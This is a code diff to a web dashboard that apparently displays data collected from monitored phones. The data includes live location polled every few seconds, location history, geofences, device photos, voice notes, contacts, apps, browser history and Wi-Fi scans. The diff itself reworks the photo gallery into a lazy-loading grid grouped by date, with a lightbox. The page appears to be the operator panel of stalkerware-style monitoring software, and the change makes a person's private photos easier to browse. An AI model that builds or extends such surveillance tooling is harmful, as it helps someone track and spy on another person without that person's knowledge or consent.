@@ -95,11 +95,20 @@ button#loadHistoryBtn{padding:5px 7px;font-size:13px;min-height:30px;min-width:3
 .card .value{font-size:14px;font-weight:500}
 .coord-box{font-family:'SF Mono','Fira Code',monospace;font-size:20px;color:var(--accent);background:var(--bg);padding:8px 12px;border-radius:var(--radius);margin:8px 0}
 .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-.photo-feed{display:flex;flex-direction:column;gap:14px}
-.photo-feed .pwrap{background:var(--card);border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)}
-.photo-feed img{width:100%;height:auto;max-height:60vh;object-fit:contain;cursor:pointer;background:#000}
-.photo-feed .pcap{padding:8px 10px;font-size:12px;color:var(--text);display:flex;flex-direction:column;gap:2px}
-.photo-feed .pcap .ptime{color:var(--muted);font-size:11px}
+.photo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:5px}
+.photo-grid .pwrap{background:var(--card);border-radius:6px;overflow:hidden;cursor:pointer;position:relative;aspect-ratio:1;border:1px solid var(--border);transition:border-color .15s}
+.photo-grid .pwrap:hover{border-color:var(--accent)}
+.photo-grid img{width:100%;height:100%;object-fit:cover;display:block}
+.photo-grid .pcap{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.85));padding:5px 7px;font-size:9px;color:#eee;opacity:0;transition:opacity .2s;pointer-events:none}
+.photo-grid .pwrap:hover .pcap{opacity:1}
+.photo-grid .pcap .ptime{font-size:8px;color:#bbb;margin-top:1px}
+.photo-day{border-top:1px solid var(--border);padding-top:10px;margin-bottom:8px}
+.photo-day:first-child{border-top:none}
+.photo-day-header{font-size:12px;color:var(--accent);font-weight:600;margin-bottom:6px;display:flex;justify-content:space-between}
+.photo-day-count{font-weight:400;color:var(--muted);font-size:11px}
+.load-more-btn{width:100%;padding:10px;text-align:center;font-size:12px;color:var(--accent);background:var(--card);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;margin-top:6px;transition:.1s}
+.load-more-btn:hover{background:var(--accent);color:#000}
+.load-more-btn:disabled{opacity:.4;cursor:default}
 .bar-chart{margin:6px 0}
 .bar-row{display:flex;align-items:center;gap:8px;margin-bottom:4px;font-size:12px}
 .bar-fill{height:18px;background:var(--accent);border-radius:3px;min-width:2px}
@@ -238,7 +247,17 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
   </div>
 </div>
 </div>
-<div id="tab-photos"><div style="display:flex;justify-content:flex-end;margin-bottom:8px"><span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="cachedPhotos={};pollPhotos()">🔄 Refresh</span></div><div class="photo-feed" id="photoGrid"><div class="label">No photos yet</div></div></div>
+<div id="tab-photos">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
+<span style="font-size:14px;font-weight:500">&#x1F4F8; Photos <span id="photoCount" style="font-weight:400;color:var(--muted);font-size:12px"></span></span>
+<div style="display:flex;gap:6px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="loadAllPhotos()">&#x1F4C2; Load All</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="photoOffset=0;cachedPhotos={};pollPhotos()">&#x1F504; Refresh</span>
+</div>
+</div>
+<div id="photoGrid" class="photo-grid"><div class="label" style="margin:20px 0">&#x1F4F8; Click the Photos tab to load</div></div>
+<div id="loadMoreContainer"></div>
+</div>
 <div id="tab-timeline">
 <div class="filter-chips" id="timelineChips">
 <span class="chip active" data-filter="all" data-label="All">All</span>
@@ -432,7 +451,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 </div>
 </div>
 </div>
-<div class="lightbox" id="lightbox"><img id="lightboxImg" alt=""></div>
+<div class="lightbox" id="lightbox"><img id="lightboxImg" alt=""><div id="lightboxCaption" style="position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.85));padding:30px 14px 10px;color:#eee;font-size:12px;text-align:center;pointer-events:none"></div></div>
 
 <script>
 // --- Firebase Config ---
@@ -485,7 +504,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, photos: 300000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -727,18 +746,6 @@ document.getElementById('removeHomeBtn').addEventListener('click', async () => {
   } catch { showAlert('Failed to remove home', 'error'); }
 });
 
-// --- Photo Lightbox ---
-document.addEventListener('click', e => {
-  const img = e.target.closest('.photo-feed img');
-  if (img) {
-    document.getElementById('lightboxImg').src = img.src;
-    document.getElementById('lightbox').classList.add('open');
-  }
-});
-document.getElementById('lightbox').addEventListener('click', function() {
-  this.classList.remove('open');
-});
-
 // --- Tabs ---
 const MAP_TABS = new Set(['live', 'playback']);
 function toggleMap(show) {
@@ -763,6 +770,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'storage') refreshStorage();
     if (btn.dataset.tab === 'browser') pollBrowserHistory();
     if (btn.dataset.tab === 'permissions') { if (window.permCache) renderPermissions(); else pollPermissions(); }
+    if (btn.dataset.tab === 'photos') pollPhotos();
     if (btn.dataset.tab === 'wifi') pollWifiScans();
   });
 });
@@ -783,7 +791,6 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   if (trail) { map.removeLayer(trail); trail = null; }
   loadGeofences(selectedDevice);
   pollAll();
-  preloadPhotos();
 });
 
 // --- Polling ---
@@ -795,7 +802,6 @@ function startPolling() {
   stopPolling();
   pollLocation();
   schedulePoll('meta', intervals.meta, pollMeta);
-  schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('apps', intervals.apps, pollApps);
   schedulePoll('hist', intervals.hist, pollHistory);
   schedulePoll('voice', intervals.voice, pollVoiceNotes);
@@ -817,7 +823,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans()];
+  const fns = [pollLocation(), pollMeta(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -959,64 +965,178 @@ async function pollMeta() {
   }
 }
 
+// --- Photos (Lazy Load) ---
+let cachedPhotos = {};
+let photoKeys = [];
+let photoOffset = 0;
+const PHOTO_BATCH = 24;
+let photoLoading = false;
+
+function dateBucket(ts) {
+  if (!ts) return 'Older';
+  const now = new Date();
+  const d = new Date(ts);
+  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+  const yesterday = new Date(today - 86400000);
+  const weekAgo = new Date(today - 6 * 86400000);
+  const monthAgo = new Date(today - 29 * 86400000);
+  if (d >= today) return 'Today';
+  if (d >= yesterday) return 'Yesterday';
+  if (d >= weekAgo) return 'This Week';
+  if (d >= monthAgo) return 'This Month';
+  return 'Older';
+}
+
 function renderPhotosFromCache() {
   const grid = document.getElementById('photoGrid');
-  const groups = {};
-  for (const [ts, doc] of Object.entries(cachedPhotos)) {
+  const countEl = document.getElementById('photoCount');
+  const lmContainer = document.getElementById('loadMoreContainer');
+  if (!grid) return;
+  if (!Object.keys(cachedPhotos).length) {
+    const total = photoKeys.length;
+    grid.innerHTML = '<div class="label" style="margin:20px 0">&#x1F4F8; ' + (total ? 'Loaded ' + photoOffset + '/' + total + ' &mdash; click Load More below' : 'No photos yet') + '</div>';
+    if (countEl) countEl.innerHTML = total ? '&middot; ' + total + ' total' : '';
+    if (lmContainer) lmContainer.innerHTML = '';
+    return;
+  }
+
+  // Dedup by (fileName, dateTaken) keeping highest quality
+  const dedup = {};
+  for (const doc of Object.values(cachedPhotos)) {
     if (!doc || !doc.data) continue;
     const key = (doc.fileName || '') + '|' + (doc.dateTaken || '');
-    const existing = groups[key];
-    if (!existing || (doc.data.length > (existing.data ? existing.data.length : 0))) {
-      groups[key] = doc;
-    }
+    const existing = dedup[key];
+    if (!existing || (doc.data.length > existing.data.length)) dedup[key] = doc;
   }
-  const tsKeys = Object.keys(groups).sort((a, b) => {
-    const va = groups[a], vb = groups[b];
-    return ((vb.dateTaken || 0) - (va.dateTaken || 0)) || ((vb.timestamp || 0) - (va.timestamp || 0));
-  });
-  if (!tsKeys.length) { grid.innerHTML = '<div class="label">No photos yet</div>'; return; }
-  grid.innerHTML = tsKeys.map(key => {
-    const doc = groups[key];
-    if (!doc) return '';
-    const ts = doc.timestamp || 0;
-    const dateTaken = doc.dateTaken ? 'Captured: ' + pkt(doc.dateTaken) : '';
-    const synced = 'Synced: ' + pkt(ts);
-    const name = doc.fileName ? doc.fileName : '';
-    const line1 = name || dateTaken || synced;
-    const line2 = dateTaken ? dateTaken + ' | ' + synced : synced;
-    return '<div class="pwrap"><img src="data:image/jpeg;base64,' + doc.data + '" loading="eager" decoding="async"><div class="pcap"><div>' + escHtml(line1) + '</div><div class="ptime">' + escHtml(line2) + '</div></div></div>';
-  }).filter(Boolean).join('') || '<div class="label">No photos yet</div>';
+
+  const totalStr = photoKeys.length ? ' &middot; ' + photoKeys.length + ' total' : '';
+  if (countEl) countEl.innerHTML = '&middot; ' + Object.keys(dedup).length + ' loaded' + totalStr;
+
+  // Group by date bucket
+  const groups = {};
+  for (const doc of Object.values(dedup)) {
+    const ts = doc.dateTaken || doc.timestamp || 0;
+    const bucket = dateBucket(ts);
+    if (!groups[bucket]) groups[bucket] = [];
+    groups[bucket].push(doc);
+  }
+
+  let html = '';
+  const bucketOrder = ['Today', 'Yesterday', 'This Week', 'This Month', 'Older'];
+  for (const b of bucketOrder) {
+    if (!groups[b] || !groups[b].length) continue;
+    groups[b].sort((a, b) => ((b.dateTaken || 0) - (a.dateTaken || 0)));
+    html += '<div class="photo-day">';
+    html += '<div class="photo-day-header"><span>' + b + '</span><span class="photo-day-count">' + groups[b].length + ' photos</span></div>';
+    html += '<div class="photo-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:5px">';
+    for (const doc of groups[b]) {
+      const ts = doc.timestamp || 0;
+      const dateTaken = doc.dateTaken ? pkt(doc.dateTaken) : '';
+      const fileName = doc.fileName || '';
+      const synced = pkt(ts);
+      html += '<div class="pwrap" data-ts="' + ts + '" onclick="openPhotoLightbox(this)">' +
+        '<img src="data:image/jpeg;base64,' + doc.data + '" loading="lazy" decoding="async">' +
+        '<div class="pcap"><div>' + escHtml(fileName || dateTaken || synced) + '</div>' +
+        '<div class="ptime">' + (dateTaken ? dateTaken + ' &middot; ' : '') + synced + '</div></div></div>';
+    }
+    html += '</div></div>';
+  }
+
+  const loaded = Object.keys(dedup).length;
+  grid.innerHTML = html || '<div class="label" style="margin:20px 0">&#x1F4F8; No photos matched</div>';
+
+  // Load more button
+  if (photoOffset < photoKeys.length) {
+    const remaining = photoKeys.length - photoOffset;
+    lmContainer.innerHTML = '<div class="load-more-btn" onclick="loadMorePhotos()">&#x2B07; Load ' + Math.min(PHOTO_BATCH, remaining) + ' more (' + remaining + ' remaining)</div>';
+  } else {
+    lmContainer.innerHTML = loaded > 0 ? '<div style="text-align:center;font-size:11px;color:var(--muted);margin-top:6px">&#x2714; All photos loaded (' + loaded + ')</div>' : '';
+  }
+}
+
+async function loadMorePhotos() {
+  if (photoLoading || !photoKeys.length || photoOffset >= photoKeys.length) return;
+  photoLoading = true;
+  const batch = photoKeys.slice(photoOffset, photoOffset + PHOTO_BATCH);
+  const lmContainer = document.getElementById('loadMoreContainer');
+  lmContainer.innerHTML = '<div class="load-more-btn" disabled>&#x23F3; Loading...</div>';
+
+  for (const ts of batch) {
+    if (cachedPhotos[ts]) continue;
+    try {
+      const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${ts}`);
+      if (doc && doc.data && doc.data.startsWith('/9j/')) {
+        cachedPhotos[ts] = doc;
+      }
+    } catch {}
+  }
+  photoOffset += batch.length;
+  photoLoading = false;
+  renderPhotosFromCache();
 }
 
 async function loadPhotos() {
   if (!selectedDevice) return;
   const grid = document.getElementById('photoGrid');
+  const lmContainer = document.getElementById('loadMoreContainer');
+  grid.innerHTML = '<div class="label" style="margin:20px 0;color:var(--accent)">&#x23F3; Loading photo list...</div>';
+  if (lmContainer) lmContainer.innerHTML = '';
+
   const keys = await fetchRTDB(`devices/${selectedDevice}/photos`, 'shallow=true');
-  if (!keys || typeof keys !== 'object') return;
-  const sortedKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-  const batch = sortedKeys.slice(0, 20);
-  if (!batch.length) return;
-  if (!Object.keys(cachedPhotos).length) {
-    grid.innerHTML = '<div class="label" style="color:var(--accent)">Loading photos...</div>';
+  if (!keys || typeof keys !== 'object') {
+    grid.innerHTML = '<div class="label" style="margin:20px 0">&#x1F4F8; No photos yet</div>';
+    photoKeys = [];
+    photoOffset = 0;
+    return;
   }
-  for (const ts of batch) {
-    if (cachedPhotos[ts]) continue;
-    const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${ts}`);
-    if (doc && doc.data && doc.data.startsWith('/9j/')) {
-      cachedPhotos[ts] = doc;
-    }
+
+  photoKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
+  photoOffset = 0;
+
+  // Filter out already cached keys
+  const freshKeys = photoKeys.filter(k => !cachedPhotos[k]);
+  if (freshKeys.length === 0) {
+    renderPhotosFromCache();
+    return;
   }
+
+  photoLoading = false;
+  await loadMorePhotos();
 }
 
 async function pollPhotos() {
+  if (!selectedDevice) return;
   await loadPhotos();
-  renderPhotosFromCache();
 }
 
-async function preloadPhotos() {
-  await loadPhotos();
-  renderPhotosFromCache();
+async function loadAllPhotos() {
+  if (!selectedDevice || !photoKeys.length) { await pollPhotos(); return; }
+  photoLoading = false;
+  while (photoOffset < photoKeys.length) {
+    await loadMorePhotos();
+    await new Promise(r => setTimeout(r, 10));
+  }
 }
+
+function openPhotoLightbox(el) {
+  const img = el ? el.querySelector('img') : null;
+  if (!img) return;
+  const lightbox = document.getElementById('lightbox');
+  const lightboxImg = document.getElementById('lightboxImg');
+  const caption = document.getElementById('lightboxCaption');
+  if (!lightbox || !lightboxImg) return;
+  lightboxImg.src = img.src;
+  const capEl = el.querySelector('.pcap');
+  if (caption) caption.innerHTML = capEl ? capEl.innerHTML : '';
+  lightbox.classList.add('open');
+}
+
+// Update lightbox click handler
+document.getElementById('lightbox')?.addEventListener('click', function() {
+  this.classList.remove('open');
+});
+
+// --- RTDB Sync Trigger ---
 
 // --- RTDB Sync Trigger ---
 let autoSyncTimer = null;
